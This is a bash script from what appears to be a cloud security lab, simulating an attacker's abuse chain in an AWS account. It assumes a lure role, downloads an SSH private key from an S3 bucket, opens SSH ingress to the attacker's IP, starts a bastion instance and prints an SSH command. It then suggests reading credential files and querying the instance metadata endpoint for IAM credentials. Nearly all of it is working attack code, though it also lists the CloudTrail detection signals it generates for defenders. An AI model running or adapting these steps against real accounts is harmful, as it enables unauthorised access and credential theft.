#!/usr/bin/env bash
#
# abuse.sh — Simulate attacker abuse of Scenario 4 (S3 SSH Key → EC2 Bastion)
#
# This script walks through the attack chain step by step with colored output.
# It assumes the caller has valid AWS credentials for any identity in the account.
#
# NOTE: This script will START the EC2 instance and SSH into it.
#       Run scenario-5 abuse from inside the bastion for the full chain.
#
# Usage:
#   chmod +x abuse.sh
#   ./abuse.sh
#
set -euo pipefail

# ---------------------------------------------------------------
# Colors and helpers
# ---------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

step() { echo -e "\n${CYAN}[STEP $1]${NC} $2"; }
info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

REGION="${AWS_DEFAULT_REGION:-us-west-2}"

echo -e "${RED}"
echo "============================================="
echo "  SCENARIO 4 — ABUSE CHAIN"
echo "  S3 SSH Key → EC2 Bastion Lure"
echo "============================================="
echo -e "${NC}"

# ---------------------------------------------------------------
step "1" "Resolving account identity"
# ---------------------------------------------------------------
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
CALLER_ARN=$(aws sts get-caller-identity --query "Arn" --output text)
info "Account ID: ${ACCOUNT_ID}"
info "Caller ARN: ${CALLER_ARN}"

# ---------------------------------------------------------------
step "2" "Assuming lure role: devops-s3-deploy-role"
# ---------------------------------------------------------------
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/devops-s3-deploy-role"
attack "sts:AssumeRole → ${ROLE_ARN}"

CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_ARN}" \
  --role-session-name "recon-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .SessionToken)
info "Role assumed successfully"

# ---------------------------------------------------------------
step "3" "Listing S3 buckets — finding deploy keys bucket"
# ---------------------------------------------------------------
attack "s3:ListAllMyBuckets"
aws s3 ls
BUCKET_NAME="devops-deploy-keys-${ACCOUNT_ID}"
info "Target bucket: ${BUCKET_NAME}"

# ---------------------------------------------------------------
step "4" "Downloading SSH private key from S3"
# ---------------------------------------------------------------
KEY_FILE="/tmp/prod-bastion-keypair.pem"
attack "s3:GetObject → s3://${BUCKET_NAME}/keys/prod-bastion-keypair.pem"
aws s3 cp "s3://${BUCKET_NAME}/keys/prod-bastion-keypair.pem" "${KEY_FILE}"
chmod 600 "${KEY_FILE}"
info "SSH key saved to: ${KEY_FILE}"

# ---------------------------------------------------------------
step "5" "Discovering bastion instance (ec2:DescribeInstances)"
# ---------------------------------------------------------------
attack "ec2:DescribeInstances (filter: Name=prod-bastion-host)"
INSTANCE_INFO=$(aws ec2 describe-instances \
  --region "${REGION}" \
  --filters "Name=tag:Name,Values=prod-bastion-host" \
  --query "Reservations[0].Instances[0].[InstanceId,State.Name,PublicIpAddress]" \
  --output text)

INSTANCE_ID=$(echo "${INSTANCE_INFO}" | awk '{print $1}')
INSTANCE_STATE=$(echo "${INSTANCE_INFO}" | awk '{print $2}')
info "Instance ID: ${INSTANCE_ID}"
info "Current state: ${INSTANCE_STATE}"

# ---------------------------------------------------------------
step "6" "Discovering security group (ec2:DescribeSecurityGroups)"
# ---------------------------------------------------------------
attack "ec2:DescribeSecurityGroups"
SG_ID=$(aws ec2 describe-instances \
  --region "${REGION}" \
  --instance-ids "${INSTANCE_ID}" \
  --query "Reservations[0].Instances[0].SecurityGroups[0].GroupId" \
  --output text)
info "Security Group: ${SG_ID}"

echo ""
info "Current ingress rules:"
aws ec2 describe-security-groups \
  --region "${REGION}" \
  --group-ids "${SG_ID}" \
  --query "SecurityGroups[0].IpPermissions[*].[IpProtocol,FromPort,ToPort,IpRanges[*].CidrIp]" \
  --output table

# ---------------------------------------------------------------
step "7" "Adding attacker IP to security group (ec2:AuthorizeSecurityGroupIngress)"
# ---------------------------------------------------------------
# Get the attacker's public IP
MY_IP=$(curl -s https://checkip.amazonaws.com)/32
attack "ec2:AuthorizeSecurityGroupIngress → ${SG_ID} (SSH from ${MY_IP})"
aws ec2 authorize-security-group-ingress \
  --region "${REGION}" \
  --group-id "${SG_ID}" \
  --protocol tcp \
  --port 22 \
  --cidr "${MY_IP}" 2>/dev/null || warn "Rule may already exist"
info "SSH rule added for ${MY_IP}"

# ---------------------------------------------------------------
step "8" "Starting the stopped instance (ec2:StartInstances)"
# ---------------------------------------------------------------
if [ "${INSTANCE_STATE}" = "stopped" ]; then
  attack "ec2:StartInstances → ${INSTANCE_ID}"
  aws ec2 start-instances \
    --region "${REGION}" \
    --instance-ids "${INSTANCE_ID}" > /dev/null
  info "Waiting for instance to reach running state..."
  aws ec2 wait instance-running \
    --region "${REGION}" \
    --instance-ids "${INSTANCE_ID}"
  info "Instance is running"
else
  info "Instance already in state: ${INSTANCE_STATE}"
fi

# ---------------------------------------------------------------
step "9" "Getting bastion public IP"
# ---------------------------------------------------------------
info "Waiting for public IP assignment..."
BASTION_IP="None"
for i in {1..12}; do
  BASTION_IP=$(aws ec2 describe-instances \
    --region "${REGION}" \
    --instance-ids "${INSTANCE_ID}" \
    --query "Reservations[0].Instances[0].PublicIpAddress" \
    --output text)
  if [ "${BASTION_IP}" != "None" ] && [ -n "${BASTION_IP}" ]; then
    break
  fi
  sleep 5
done

if [ "${BASTION_IP}" = "None" ] || [ -z "${BASTION_IP}" ]; then
  warn "No public IP assigned. Ensure the instance is in a public subnet with AssociatePublicIpAddress enabled."
  exit 1
fi
info "Bastion Public IP: ${BASTION_IP}"

# ---------------------------------------------------------------
step "10" "Connecting via SSH"
# ---------------------------------------------------------------
echo ""
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  Ready to SSH into bastion${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo -e "${YELLOW}Detection signals generated so far:${NC}"
echo "  • CloudTrail: AssumeRole on devops-s3-deploy-role"
echo "  • CloudTrail: ListBuckets, GetObject on deploy keys bucket"
echo "  • CloudTrail: DescribeInstances, DescribeSecurityGroups"
echo "  • CloudTrail: AuthorizeSecurityGroupIngress (added ${MY_IP})"
echo "  • CloudTrail: StartInstances on ${INSTANCE_ID}"
echo ""
echo -e "${CYAN}Run the following to SSH in:${NC}"
echo ""
echo "  ssh -i ${KEY_FILE} ec2-user@${BASTION_IP}"
echo ""
echo -e "${CYAN}Once inside, explore:${NC}"
echo "  cat /home/ec2-user/.env"
echo "  cat /home/ec2-user/config/db-backup-creds.json"
echo "  cat /home/ec2-user/.ssh/internal-hosts.conf"
echo "  sudo cat /root/.aws/credentials"
echo ""
echo -e "${CYAN}Check for instance profile (leads to scenario-5):${NC}"
echo "  curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
echo ""

# ---------------------------------------------------------------
# Cleanup session (don't clean up SG/instance — leave for manual review)
# ---------------------------------------------------------------
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
info "Session credentials cleared (instance and SG changes persist)"
